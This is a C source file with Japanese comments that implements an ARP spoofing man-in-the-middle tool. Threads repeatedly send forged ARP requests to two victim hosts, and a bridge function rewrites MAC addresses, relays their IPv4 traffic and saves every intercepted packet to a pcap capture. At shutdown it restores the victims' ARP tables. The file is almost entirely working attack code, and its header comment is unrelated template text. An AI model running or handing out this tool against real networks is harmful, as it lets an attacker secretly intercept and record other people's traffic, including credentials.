/*
 ============================================================================
 Name        : ARPspoof.c
 Author      : 
 Version     :
 Copyright   : Your copyright notice
 Description : Hello World in C, Ansi-style
 ============================================================================
 */

#include	<stdio.h>
#include    <stdlib.h>
#include	<string.h>
#include	<unistd.h>
#include	<poll.h>
#include	<errno.h>
#include	<signal.h>
#include	<stdarg.h>
#include	<sys/socket.h>
#include	<arpa/inet.h>
#include	<netinet/if_ether.h>
#include    <sys/ioctl.h>
#include    <linux/if.h>
#include    <netinet/ip.h>
#include    <pthread.h>
#include    <unistd.h>
#include    <sys/time.h>
#include    <signal.h>

#include	"netutil.h"
#include   "pcap_dump.h"

//MITMパケットを検出し、IPアドレスとMACアドレスを書き換えとく
int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_char send_mac[6],in_addr_t rec_ip,u_char rec_mac[6]){
    u_char    *ptr;
    int    lest;
    struct ether_header    *eh;
    char    buf[80];

    ptr=data;
    lest=size;

    //イーサヘッダの分離
    if(lest<sizeof(struct ether_header)){
        DebugPrintf("[%d]:lest(%d)<sizeof(struct ether_header)\n",deviceNo,lest);
        //そもそも有効なパケットではない
        return(-1);
    }
    eh=(struct ether_header *)ptr;
    ptr+=sizeof(struct ether_header);
    lest-=sizeof(struct ether_header);

    //宛先MACアドレスがこのNICでなかったらそもそも違う
    if(memcmp(&eh->ether_dhost,Device[deviceNo].hwaddr,6)!=0){
        DebugPrintf("[%d]:dhost not match %s\n",deviceNo,my_ether_ntoa_r((u_char *)&eh->ether_dhost,buf,sizeof(buf)));
        //そもそも見なくて良い
        return(-1);
    }

    //判別
    if(ntohs(eh->ether_type)==ETHERTYPE_ARP){
        struct ether_arp    *arp;

        if(lest<sizeof(struct ether_arp)){
            DebugPrintf("[%d]:lest(%d)<sizeof(struct ether_arp)\n",deviceNo,lest);
            return(-1);
        }
        arp=(struct ether_arp *)ptr;
        ptr+=sizeof(struct ether_arp);
        lest-=sizeof(struct ether_arp);

        if(arp->arp_op==htons(ARPOP_REQUEST)){
            DebugPrintf("[%d]recv:ARP REQUEST:%dbytes\n",deviceNo,size);
            //Ip2Mac(deviceNo,*(in_addr_t *)arp->arp_spa,arp->arp_sha);
        }
        if(arp->arp_op==htons(ARPOP_REPLY)){
            DebugPrintf("[%d]recv:ARP REPLY:%dbytes\n",deviceNo,size);
            //Ip2Mac(deviceNo,*(in_addr_t *)arp->arp_spa,arp->arp_sha);
        }

        //送信者かつ受信者のIPv4アドレスをチェック
        int isAtoB = *(in_addr_t *)arp->arp_spa == send_ip && *(in_addr_t *)arp->arp_tpa == rec_ip;
        int isBtoA = *(in_addr_t *)arp->arp_spa == rec_ip && *(in_addr_t *)arp->arp_tpa == send_ip;
        if(isAtoB || isBtoA){
            //AとBの間のARPパケットなので、無視する。（仲介してあげない）
            DebugPrintf("[%d]recv:MITM ARP PACKET:%dbytes\n",deviceNo,size);
            return (-1);
        }
    }
    else if(ntohs(eh->ether_type)==ETHERTYPE_IP){
        //IPv4にしか対応してない
        struct iphdr    *iphdr;

        if(lest<sizeof(struct iphdr)){
            DebugPrintf("[%d]:lest(%d)<sizeof(struct iphdr)\n",deviceNo,lest);
            return(-1);
        }
        iphdr=(struct iphdr *)ptr;
        ptr+=sizeof(struct iphdr);
        lest-=sizeof(struct iphdr);

        struct in_addr tempS, tempR;
        tempS.s_addr = iphdr->saddr;
        tempR.s_addr = iphdr->daddr;
        DebugPrintf("IP PACKET: %s to %s\n",inet_ntoa(tempS), inet_ntoa(tempR));

        int isAtoB = (iphdr->saddr == send_ip && iphdr->daddr == rec_ip);
        int isBtoA = (iphdr->saddr == rec_ip && iphdr->daddr == send_ip);
        //AからBへの通信のときは、IPアドレスとMACアドレスを入れ替えとく。
        if(isAtoB || isBtoA){
            pcap_write(data, size);
            DebugPrintf("[%d]recv:MITM IP PACKET:%dbytes\n",deviceNo,size);
            printf("MITM IP PACKET\n");
            int ii=0;
            //宛先は、AtoBならBに、BtoAならAのMACアドレスにする
            if(isAtoB){
                for(ii=0; ii<6; ii++) eh->ether_dhost[ii] = rec_mac[ii];
            }else{
                for(ii=0; ii<6; ii++) eh->ether_dhost[ii] = send_mac[ii];
            }
            //送信元MACアドレスは自分
            for(ii=0; ii<6; ii++) eh->ether_shost[ii] = Device[deviceNo].hwaddr[ii];
            //IPアドレスは、送信元が端末A、宛先が端末Bになってるので変える必要はない
            return(1);
        }
    }

    return(0);
}

//ARPスプーフィングした後の中間者としてのブリッジ(IPForwardingをオンにしておいた方がいい。)
int MITMBridge(in_addr_t send_ip,u_char send_mac[6],in_addr_t rec_ip,u_char rec_mac[6]){
    struct pollfd    targets[2];
    int    nready,size;
    u_char    buf[2048];

    targets[0].fd=Device[0].soc;
    targets[0].events=POLLIN|POLLERR;
    targets[1].fd=Device[1].soc;
    targets[1].events=POLLIN|POLLERR;

    int deviceNo = 0;   //使うネットワークデバイス

    while(EndFlag==0){
        switch(nready=poll(targets,2,100)){
            case    -1:
                if(errno!=EINTR){
                    perror("poll");
                }
                break;
            case    0:
                break;
            default:

                if(targets[deviceNo].revents&(POLLIN|POLLERR)){
                    if((size=read(Device[deviceNo].soc,buf,sizeof(buf)))<=0){
                        perror("read");
                    }
                    else{
                        if(AnalyzePacket(deviceNo,buf,size)!=-1){
                            u_char tmpBuf[2048];
                            memcpy(tmpBuf, buf, size);
                            //MITMパケットの場合だけ書き換えて送る
                            if(proccessMITMPacket(deviceNo, tmpBuf, size, send_ip, send_mac, rec_ip, rec_mac) ){
                                if((size=write(Device[deviceNo].soc, tmpBuf,size))<=0){
                                    perror("write");
                                }
                            }
                        }
                    }

                }
                break;
        }
    }

    return (0);
}


//スレッド関係---
struct argArp{
    int soc;
    in_addr_t ip_d;
    in_addr_t ip_s;
    u_char mac_d[6];
    u_char mac_s[6];
};

void *arpspoof(void *p){
    struct argArp  *arg = (struct argArp *)p;
    while(1){
        SendArpRequestB(arg->soc, arg->ip_d, arg->mac_d, arg->ip_s, arg->mac_s);
        usleep(10*1000000);
    }

    return (NULL);
}

void *StartMITMBridge(void *p){
    struct argArp  *arg = (struct argArp *)p;
    MITMBridge(arg->ip_d, arg->mac_d, arg->ip_s, arg->mac_s);
    return (NULL);
}

//---

int main(int argc,char *argv[],char *envp[])
{
    char    buf[80];

    //----デバイスセッティング
    if(GetDeviceInfo(Param.Device1,Device[0].hwaddr,&Device[0].addr,&Device[0].subnet,&Device[0].netmask)==-1){
        DebugPrintf("GetDeviceInfo:error:%s\n",Param.Device1);
        return(-1);
    }
    if((Device[0].soc=InitRawSocket(Param.Device1,1,0))==-1){
        DebugPrintf("InitRawSocket:error:%s\n",Param.Device1);
        return(-1);
    }
    DebugPrintf("%s OK\n",Param.Device1);
    DebugPrintf("addr=%s\n",my_inet_ntoa_r(&Device[0].addr,buf,sizeof(buf)));
    DebugPrintf("subnet=%s\n",my_inet_ntoa_r(&Device[0].subnet,buf,sizeof(buf)));
    DebugPrintf("netmask=%s\n",my_inet_ntoa_r(&Device[0].netmask,buf,sizeof(buf)));
    //----デバイスセッティングここまで

    DisableIpForward();

    signal(SIGINT,EndSignal);
    signal(SIGTERM,EndSignal);
    signal(SIGQUIT,EndSignal);

    signal(SIGPIPE,SIG_IGN);
    signal(SIGTTIN,SIG_IGN);
    signal(SIGTTOU,SIG_IGN);

    DebugPrintf("bridge start\n");

    //スレッド関係の変数
    pthread_t arpTid;
    pthread_t arpTid_r;
    pthread_t bridgeTid;
    pthread_attr_t  attr;

    pthread_attr_init(&attr);

    static  u_char    mac_A[6];
    str2macaddr(Param.mac_A, mac_A);
    static  u_char    mac_B[6];
    str2macaddr(Param.mac_B, mac_B);

    //---ARPスプーフィング
    //static  u_char    bcast[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};    //ブロードキャストMACアドレス
    char    *in_addr_text_sender = Param.ip_A;                     //ARPスプーフィング先A
    char    *in_addr_text_receiver = Param.ip_B;                   //ARPスプーフィング先B (A→Bの通信を横取りする)
    struct  in_addr    sendIp;
    struct  in_addr    recIp;

    inet_aton(in_addr_text_sender, &sendIp);
    inet_aton(in_addr_text_receiver, &recIp);

    //スレッド用引数の準備
    struct argArp arg_arpspoof;
    arg_arpspoof.soc = Device[0].soc;
    arg_arpspoof.ip_d = sendIp.s_addr;
    arg_arpspoof.ip_s = recIp.s_addr;
    //MACaddrのコピー
    memcpy(arg_arpspoof.mac_d, mac_A, 6);
    memcpy(arg_arpspoof.mac_s, Device[0].hwaddr, 6);

    //A→BのARPスプーフィング開始。ARPリクエストを送りつける
    int status;
    if((status=pthread_create(&arpTid,&attr, arpspoof, &arg_arpspoof))!=0){
        DebugPrintf("pthread_create:%s\n",strerror(status));
    }

    //IPAddrを入れ替えただけ

    //スレッド用引数の準備
    struct argArp arg_arpspoof_r;
    arg_arpspoof_r.soc = Device[0].soc;
    arg_arpspoof_r.ip_d = recIp.s_addr;
    arg_arpspoof_r.ip_s = sendIp.s_addr;
    //MACaddrのコピー
    memcpy(arg_arpspoof_r.mac_d, mac_B, 6);
    memcpy(arg_arpspoof_r.mac_s, Device[0].hwaddr, 6);

    //B→AのARPスプーフィング開始。ARPリクエストを送りつける
    if((status=pthread_create(&arpTid_r,&attr, arpspoof, &arg_arpspoof_r))!=0){
        DebugPrintf("pthread_create:%s\n",strerror(status));
    }

    //---ARPスプーフィングここまで
    //---ブリッジ

    //スレッド用引数の準備
    struct argArp arg_bridge;
    arg_bridge.soc  = Device[0].soc;
    arg_bridge.ip_d = sendIp.s_addr;
    arg_bridge.ip_s = recIp.s_addr;
    //MACaddrのコピー
    memcpy(arg_bridge.mac_d, mac_A, 6);
    memcpy(arg_bridge.mac_s, mac_B, 6);

    //pcapダンプ用意
    pcap_init();

    //双方向ブリッジ開始
    if((status=pthread_create(&bridgeTid,&attr, StartMITMBridge, &arg_bridge))!=0){
        DebugPrintf("pthread_create:%s\n",strerror(status));
    }

    //Bridge();
    //---ブリッジここまで
    DebugPrintf("bridge end\n");

    //-----SIGによるスレッドの終了ここから----
	int signo;
	sigset_t ss;

	/* シグナルハンドリングの準備 */
	sigemptyset(&ss);

	/* block SIGTERM */
	if(sigaddset(&ss, SIGINT) == -1){
	}

	sigprocmask(SIG_BLOCK, &ss, NULL);

    //SIGINT待ち
	for(;;){
		if(sigwait(&ss, &signo) == 0){	/* シグナルが受信できたら */
			if(signo == SIGINT){
				//puts("sigterm recept");
				break;
			}
		}
	}

    //スレッドのキャンセル
	pthread_cancel(arpTid);
    pthread_cancel(arpTid_r);
    pthread_cancel(bridgeTid);
    //-----SIGによるスレッドの終了ここまで----


    //スレッド終了を待つ
    pthread_join(arpTid     , NULL);
    pthread_join(arpTid_r   , NULL);
    pthread_join(bridgeTid  , NULL);

    //victimたちのARPテーブルの修復(ARPスプーフィングのときと違い、送信元MACaddrが正しい)
    SendArpRequestB(arg_arpspoof.soc, arg_arpspoof.ip_d, arg_arpspoof.mac_d, arg_arpspoof.ip_s, arg_arpspoof_r.mac_d);
    SendArpRequestB(arg_arpspoof_r.soc, arg_arpspoof_r.ip_d, arg_arpspoof_r.mac_d, arg_arpspoof_r.ip_s, arg_arpspoof.mac_d);

    close(Device[0].soc);

    return(0);

}
